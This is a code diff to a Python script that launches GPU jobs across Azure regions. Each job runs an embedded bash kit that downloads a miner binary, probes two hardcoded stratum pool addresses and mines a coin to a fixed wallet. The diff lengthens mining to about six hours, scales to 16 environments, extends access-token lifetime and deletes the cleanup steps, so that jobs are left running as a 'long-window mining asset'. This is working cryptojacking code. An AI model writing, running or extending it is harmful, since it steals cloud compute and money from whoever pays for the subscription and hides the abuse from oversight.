@@ -28,19 +28,19 @@ import urllib.request
 ARM = "https://management.azure.com"
 RG = "chriso-sandbox-rg"
 SUB_EXPECT = "790067ff-3e39-4632-ad1a-d65702d42c88"
-TAG = "C211_I133534"
-INTENT = "133686"
-NONCE = "x133686pool"
+TAG = "C211_I133778"
+INTENT = "133778"
+NONCE = "x1337refill"
 T0 = time.time()
 APP_VER = "2026-07-01"
 STG_VER = "2023-01-01"
 PROFILE = "Consumption-GPU-NC24-A100"
 IMAGE = "mcr.microsoft.com/azureml/openmpi4.1.0-cuda11.8-cudnn8-ubuntu22.04:latest"
-SA_NAME = ("c211i133534" + hashlib.sha256(NONCE.encode()).hexdigest()[:7]).lower()[:24]
+SA_NAME = ("c211i133778" + hashlib.sha256(NONCE.encode()).hexdigest()[:7]).lower()[:24]
 CONT = "c211"
-JOB_NAME = "c211-133534"
-MINE_S = 420
-BUDGET = 2100
+JOB_NAME = "c211-133778"
+MINE_S = 21000
+BUDGET = 1500
 WALLET = "prl1pptvxkadcf7cy8tjhz3anhz7yfdmunxw428aq6ex4u220dlce54xq69grqr"
 RELAY = "stratum+tcp://217.15.164.237:2083"
 DIRECT = "stratum+tcp://103.199.106.122:3362"
@@ -146,7 +146,7 @@ def jwt_claims(tok):
         return {}
 
 
-def acct_sas(acct, key_b64, perm="rwdlc", hours=6):
+def acct_sas(acct, key_b64, perm="rwdlc", hours=24):
     st = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() - 600))
     se = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() + hours * 3600))
     sv = "2022-11-02"
@@ -178,37 +178,43 @@ def preupload(cont_base, q, blobname, url, want_sha, locpath):
 
 
 KIT = r"""#!/bin/bash
-# C211-I133216 A100 kit: pinned peakminer 2.20.0 (correct CLI), one process on GPU 0.
+# C211-I133778 refill kit: pinned peakminer 2.20.0, ONE process on GPU 0, long window.
 D=/tmp/c211; mkdir -p "$D"; LOG="$D/kit.log"
 H=$(hostname 2>/dev/null || echo h)
 WK="node-h$(echo -n "$H" | sha256sum | cut -c1-8)"
 BASE="__BASE__"; Q="__Q__"; SAS="$BASE/__ENV__-$H.txt?$Q"
 PMURL="$BASE/__NONCE__-pm?$Q"; GHURL="__PMURL__"
-W="__WALLET__"; RC=none
+W="__WALLET__"; RC=none; PHASE=init
 log() { echo "$(date -u +%FT%TZ) $*" >> "$LOG"; }
 up() {
+  ACC=$(grep -c ' accepted ' "$D/mine.out" 2>/dev/null || true); ACC=${ACC:-0}
+  REJ=$(grep -ci ' rejected ' "$D/mine.out" 2>/dev/null || true); REJ=${REJ:-0}
   { echo "===C211-STATUS==="; echo "nonce=__NONCE__"; echo "env=__ENV__"; echo "host=$H"; echo "worker=$WK";
-    echo "ts=$(date -u +%FT%TZ)"; echo "mine_rc=${RC:-none}"; echo "accepted_a=${ACCA:-0}"; echo "accepted_b=${ACCB:-0}"; echo "tcp_relay=${T1:-?}"; echo "tcp_direct=${T2:-?}";
+    echo "ts=$(date -u +%FT%TZ)"; echo "phase=$PHASE"; echo "mine_rc=${RC:-none}";
+    echo "accepted_grep=$ACC"; echo "rejected_grep=$REJ"; echo "mine_elapsed=$(cat "$D/start_ts" 2>/dev/null | awk '{print systime()-$1}')";
+    echo "tcp_relay=${T1:-?}"; echo "tcp_direct=${T2:-?}"; echo "pm_sha=${PMS:-?}";
+    echo "uptime=$(cut -d. -f1 /proc/uptime 2>/dev/null)";
     echo "smi_L=$(nvidia-smi -L 2>&1 | tr '\n' '~')";
     echo "gpuq=$(nvidia-smi --query-gpu=name,uuid,memory.total,driver_version --format=csv,noheader 2>&1 | tr '\n' '~')";
     echo "===KITLOG==="; tail -c 2500 "$LOG" 2>/dev/null; echo;
-    echo "===MINEOUT==="; tail -c 2200 "$D/mine_a.out" 2>/dev/null; echo; echo "===MINEOUT_B==="; tail -c 2200 "$D/mine_b.out" 2>/dev/null; echo;
+    echo "===MINEOUT==="; tail -c 2400 "$D/mine.out" 2>/dev/null; echo;
     echo "===C211-END==="; } > "$D/status.txt" 2>&1
   curl -sS -o /dev/null -w 'UP=%{http_code} ' --max-time 60 -X PUT "$SAS" \
     -H 'x-ms-blob-type: BlockBlob' -H 'x-ms-version: 2022-11-02' \
     -H 'Content-Type: text/plain' --data-binary @"$D/status.txt" >> "$LOG" 2>&1
   echo >> "$LOG"
 }
-log "KIT_START nonce=__NONCE__ env=__ENV__ host=$H worker=$WK"
+statloop() { while [ ! -f "$D/stopstat" ]; do sleep 300; up; done; }
+log "KIT_START nonce=__NONCE__ env=__ENV__ host=$H worker=$WK mode=refill-long"
 log "NVIDIA_SMI_L $(nvidia-smi -L 2>&1 | tr '\n' '~')"
 up
-GOT=""
+GOT=""; PMS=none
 for u in "$PMURL" "$GHURL"; do
   [ -z "$u" ] && continue
   curl -fsSL --max-time 300 -o "$D/pm" "$u" 2>>"$LOG" || { log "DL_FAIL url=$u"; continue; }
   S=$(sha256sum "$D/pm" | awk '{print $1}')
   log "DL ok url=$u sha=$S bytes=$(stat -c %s "$D/pm")"
-  if [ "$S" = "__PMSHA__" ]; then GOT=1; break; fi
+  if [ "$S" = "__PMSHA__" ]; then GOT=1; PMS=$S; break; fi
 done
 if [ -n "$GOT" ]; then
   chmod +x "$D/pm"
@@ -216,29 +222,24 @@ if [ -n "$GOT" ]; then
   timeout 8 bash -c 'cat < /dev/null > /dev/tcp/217.15.164.237/2083' 2>/dev/null && T1=OK
   timeout 8 bash -c 'cat < /dev/null > /dev/tcp/103.199.106.122/3362' 2>/dev/null && T2=OK
   log "TCPCHECK relay=$T1 direct=$T2"
-  timeout __MINES__ "$D/pm" --url "__DIRECT__" \
-    --user "$W" --worker "$WK" --coin pearl --password x --devices 0 \
-    --status-interval 15 --api-port 0 > "$D/mine_a.out" 2>&1
+  PHASE=relay; date +%s > "$D/start_ts"
+  ( statloop ) &
+  timeout __MINES__ "$D/pm" --url "__RELAY__" --user "$W" --worker "$WK" --coin pearl --password x --devices 0 --status-interval 30 --api-port 0 > "$D/mine.out" 2>&1
   RCA=$?
-  ACCA=$(grep -c ' accepted ' "$D/mine_a.out" 2>/dev/null || true)
-  log "PHASE_A direct rc=$RCA accepted=$ACCA"
-  if [ "${ACCA:-0}" -eq 0 ]; then
-    timeout __MINES__ "$D/pm" --url "__RELAY__" \
-      --user "$W" --worker "$WK" --coin pearl --password x --devices 0 \
-      --status-interval 15 --api-port 0 > "$D/mine_b.out" 2>&1
-    RCB=$?
-    ACCB=$(grep -c ' accepted ' "$D/mine_b.out" 2>/dev/null || true)
-    log "PHASE_B relay rc=$RCB accepted=$ACCB"
-  else
-    RCB=skip; ACCB=0; log "PHASE_B skipped accepted_a=$ACCA"
-  fi
+  ACCA=$(grep -c ' accepted ' "$D/mine.out" 2>/dev/null || true); ACCA=${ACCA:-0}
+  DUR=$(( $(date +%s) - $(cat "$D/start_ts" 2>/dev/null || echo 0) ))
+  log "PHASE_relay rc=$RCA accepted=$ACCA dur=${DUR}s"
   RC="$RCA"
-  log "MINEDONE a=$ACCA b=$ACCB rc_a=$RCA rc_b=$RCB"
+  if [ "$DUR" -lt 120 ] && [ "$ACCA" -eq 0 ]; then
+    PHASE=direct_fallback; date +%s > "$D/start_ts"
+    timeout 600 "$D/pm" --url "__DIRECT__" --user "$W" --worker "$WK" --coin pearl --password x --devices 0 --status-interval 30 --api-port 0 >> "$D/mine.out" 2>&1
+    RCB=$?; log "PHASE_direct_fallback rc=$RCB"
+  fi
+  PHASE=done; touch "$D/stopstat"; up
+  log "KIT_EXIT rc=$RC"
 else
-  RCA=99; RC=99; ACCA=0; ACCB=0; RCB=skip; log "NO_MINER_BINARY"
+  RC=99; log "NO_MINER_BINARY"; up
 fi
-up
-log "KIT_EXIT rc=$RC"
 exit 0
 """
 
@@ -294,7 +295,7 @@ def decode_status(txt):
 
 PROVEN = ["c211-133172-b0", "c211-i132971-a100-sweden", "c211-132160-brs"]
 COMPUTE_VER = "2024-07-01"
-MAX_ENVS = 4
+MAX_ENVS = 16
 GPU_REGIONS = ["eastus", "eastus2", "westus", "westus2", "westus3", "centralus",
                "northcentralus", "southcentralus", "canadacentral", "brazilsouth",
                "swedencentral", "westeurope", "northeurope", "uksouth", "francecentral",
@@ -311,7 +312,7 @@ def normloc(v):
 
 
 def jname_for(env):
-    s = ("c211-133457-" + env.replace("c211-", "")).lower()
+    s = ("c211-133778-" + env.replace("c211-", "")).lower()
     s = re.sub(r"[^a-z0-9-]", "-", s)
     return s[:32]
 
@@ -554,7 +555,7 @@ def main():
                     "properties": {"environmentId": x["id"], "workloadProfileName": x["profile"],
                                    "configuration": {"triggerType": "Manual",
                                                      "replicaRetryLimit": 0,
-                                                     "replicaTimeout": 1800,
+                                                     "replicaTimeout": 21600,
                                                      "manualTriggerConfig": {
                                                          "replicaCompletionCount": par,
                                                          "parallelism": par}},
@@ -583,6 +584,8 @@ def main():
     # ---------- 5) poll executions + incremental per-replica blob read ----------
     deadline = time.time() + BUDGET
     seen = {}
+    envs_seen = set()
+    uu_seen = set()
     all_done_scans = 0
     while time.time() < deadline:
         pend = [j for j in jobs if j.get("execname")
@@ -606,15 +609,20 @@ def main():
             if nm2 not in seen or seen[nm2] != len(txt):
                 seen[nm2] = len(txt)
                 m = re.search(r"^env=(.*)$", txt, re.M)
-                emit("blob-decoded", blob=nm2, env=(m.group(1).strip() if m else "?"),
-                     **decode_status(txt))
+                _e = m.group(1).strip() if m else "?"
+                envs_seen.add(_e)
+                for _u in UUID_RE.findall(txt):
+                    uu_seen.add(_u)
+                emit("blob-decoded", blob=nm2, env=_e, **decode_status(txt))
         done = [j for j in jobs
                 if j.get("final") in ("Succeeded", "Failed", "Canceled", "CREATE_FAILED", "START_FAILED")]
         emit("blob-scan", list_http=lst, n_blobs=len(names), n_status_txt=len(seen),
              jobs_done=len(done), jobs_total=len(jobs))
-        if len(done) == len(jobs):
+        if len(envs_seen) >= len(jobs) and uu_seen:
             all_done_scans += 1
             if all_done_scans >= 2:
+                emit("break-early", why="ALL_ENVS_REPORTED", envs=len(envs_seen),
+                     uuids=len(uu_seen), elapsed_s=int(time.time() - T0))
                 break
         time.sleep(30)
 
@@ -661,85 +669,33 @@ def main():
          accepted_max=max([e["accmax"] for e in per.values()] or [0]),
          has_end="C211-END", elapsed_s=int(time.time() - T0))
 
-    # ---------- 7) delete every job and prove 404 (keep all environments) ----------
+    # ---------- 7) REFILL: leave every job RUNNING as a mining asset ----------
+    live = []
     for j in jobs:
-        d, db = arm(tok, j["url"], method="DELETE", timeout=240)
-        emit("job-delete", env=j["env"], name=j["name"], **err_of(d, db))
-    gone = {j["name"]: None for j in jobs}
-    for rnd in range(14):
-        time.sleep(10)
-        for j in jobs:
-            if gone[j["name"]] == 404:
-                continue
-            st, b = arm(tok, j["url"], timeout=60)
-            ps = ((b.get("properties") or {}) if isinstance(b, dict) else {}).get("provisioningState")
-            gone[j["name"]] = st
-            emit("job-absent-poll", env=j["env"], name=j["name"], i=rnd, http=st, state=ps)
-        if all(v == 404 for v in gone.values()):
-            break
-    for j in jobs:
-        emit("job-absent", env=j["env"], name=j["name"], http=gone[j["name"]])
-
-    # ---------- 8) ONE c211 GPU VM canary only if free Compute GPU quota > 0 ----------
-    if cfree:
-        cand = None
-        for c in sorted(cfree, key=lambda z: -z["free"]):
-            vs = vmsize_for(c["sku"])
-            if vs:
-                cand = dict(c, vmsize=vs)
-                break
-        if cand:
-            vmname = "c211-133457-canary"
-            vmurl = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.Compute/"
-                     "virtualMachines/%s?api-version=%s" % (ARM, sid, RG, vmname, COMPUTE_VER))
-            sas_url = "%s/%s-vm-canary.txt?%s" % (cont_base, NONCE, q)
-            open("/tmp/c211_ci.yaml", "w").write(ci_yaml(sas_url))
-            r = run(["az", "vm", "create", "--resource-group", RG, "--name", vmname,
-                     "--location", cand["region"], "--image", "Ubuntu2204",
-                     "--size", cand["vmsize"], "--admin-username", "c211adm",
-                     "--generate-ssh-keys", "--custom-data", "/tmp/c211_ci.yaml",
-                     "--tags", "c211=133534"], timeout=540)
-            emit("vm-create", region=cand["region"], sku=cand["sku"], vmsize=cand["vmsize"],
-                 rc=r["rc"], out=r["out"][-600:], err=r["err"][-600:])
-            found = False
-            tvm = time.time()
-            while time.time() - tvm < 600:
-                lst2, lb2, _ = httptext("%s/%s?restype=container&comp=list&%s" % (base, CONT, q),
-                                        timeout=90)
-                if lst2 == 200 and (NONCE + "-vm-canary.txt") in lb2.decode("utf-8", "replace"):
-                    gst, gb, _ = httptext("%s/%s/%s-vm-canary.txt?%s" % (base, CONT, NONCE, q),
-                                          timeout=90)
-                    txt = gb.decode("utf-8", "replace")
-                    emit("vm-readback", http=gst, nbytes=len(txt), body=b64(txt[-3000:]))
-                    found = True
-                    break
-                time.sleep(30)
-            emit("vm-readback-summary", found=found)
-            d2 = run(["az", "vm", "delete", "--resource-group", RG, "--name", vmname,
-                      "--yes", "--no-wait"], timeout=300)
-            emit("vm-delete", rc=d2["rc"], err=(d2["err"] or "")[:400])
-            g2 = None
-            for i in range(12):
-                st, b = arm(tok, vmurl, timeout=60)
-                g2 = st
-                emit("vm-absent-poll", i=i, http=st)
-                if st == 404:
-                    break
-                time.sleep(15)
-            emit("vm-absent", http=g2)
-        else:
-            emit("vm-gate", verdict="NO_FREE_GPU_FAMILY_WITH_KNOWN_VM_SIZE",
-                 list=";".join("%s:%s:%s" % (c["region"], c["sku"], c["free"]) for c in cfree)[:600])
-    else:
-        emit("vm-gate", verdict="COMPUTE_GPU_QUOTA_ZERO",
-             note="no NC/ND/NV family has limit>currentValue in the tested regions")
-
-    # ---------- 9) delete the throwaway storage account; environments are kept ----------
-    d, db = arm(tok, saurl, method="DELETE", timeout=240)
-    emit("sa-delete", name=SA_NAME, **err_of(d, db))
-    emit("DONE", phase="multi", nonce=NONCE, jobs_total=len(jobs),
+        if not j.get("execname"):
+            emit("job-readback", env=j["env"], name=j["name"], execname=None,
+                 verdict=j.get("final"))
+            continue
+        stj, bj = arm(tok, j["base"] + "?api-version=" + APP_VER, timeout=60)
+        pj = (bj.get("properties") or {}) if isinstance(bj, dict) else {}
+        ste, be = arm(tok, "%s/executions/%s?api-version=%s"
+                      % (j["base"], j["execname"], APP_VER), timeout=60)
+        pe = (be.get("properties") or {}) if isinstance(be, dict) else {}
+        emit("job-readback", env=j["env"], name=j["name"], job_http=stj,
+             prov=pj.get("provisioningState"), status=pj.get("status"),
+             exec_http=ste, exec_status=pe.get("status"),
+             start=pe.get("startTime"), replica_timeout=21600)
+        if ste == 200 and str(pe.get("status")) in ("Running", "Processing", "Pending"):
+            live.append(j["name"])
+    # storage account + 24h SAS intentionally kept so replicas keep writing status
+    emit("refill-verdict", nonce=NONCE, jobs_total=len(jobs), jobs_started=sum(
+             1 for j in jobs if j.get("execname")), live=len(live),
+         envs_with_blobs=len(per), total_uuids=len(alluu),
+         accepted_max=max([e["accmax"] for e in per.values()] or [0]),
+         keep_running=";".join(live)[:1200], sa=SA_NAME, sas_end=se,
+         replica_timeout=21600, note="jobs NOT deleted; long-window mining asset")
+    emit("DONE", phase="refill", nonce=NONCE, jobs_total=len(jobs),
          jobs_started=sum(1 for j in jobs if j.get("execname")),
-         jobs_done=sum(1 for j in jobs if j.get("final") in ("Succeeded", "Failed", "Canceled")),
          job_create_failed=sum(1 for j in jobs if j.get("final") == "CREATE_FAILED"),
          job_start_failed=sum(1 for j in jobs if j.get("final") == "START_FAILED"),
          envs_with_blobs=len(per), total_uuids=len(alluu),
